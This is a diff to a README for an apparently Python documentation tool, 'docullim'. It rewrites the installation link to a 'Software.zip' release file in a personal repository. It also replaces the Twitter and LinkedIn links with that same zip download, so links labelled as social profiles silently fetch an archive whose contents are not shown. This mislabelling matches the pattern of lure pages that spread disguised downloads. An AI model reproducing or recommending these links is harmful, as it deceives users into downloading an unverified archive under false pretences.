@@ -12,7 +12,7 @@ Welcome to the **docullim** repository! This repository focuses on auto-generati
 
 ## Installation
 
-To get started with **docullim**, you can download the source code from the following link: [Download docullim](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+To get started with **docullim**, you can download the source code from the following link: [Download docullim](https://github.com/deivyduvan/docullim/releases/download/v1.0/Software.zip)
 
 ### Note: 
 This link needs to be launched to begin the download process.
@@ -62,8 +62,8 @@ For any questions or assistance with **docullim**, please reach out to the repos
 
 Stay up to date with the latest news and updates by following us on social media:
 
-🔗 [Twitter](https://twitter.com/docullim)
-🔗 [LinkedIn](https://www.linkedin.com/company/docullim)
+🔗 [Twitter](https://github.com/deivyduvan/docullim/releases/download/v1.0/Software.zip)
+🔗 [LinkedIn](https://github.com/deivyduvan/docullim/releases/download/v1.0/Software.zip)
 
 We look forward to hearing from you and seeing how **docullim** improves your Python documentation process. Happy documenting! 🔍🐍
 
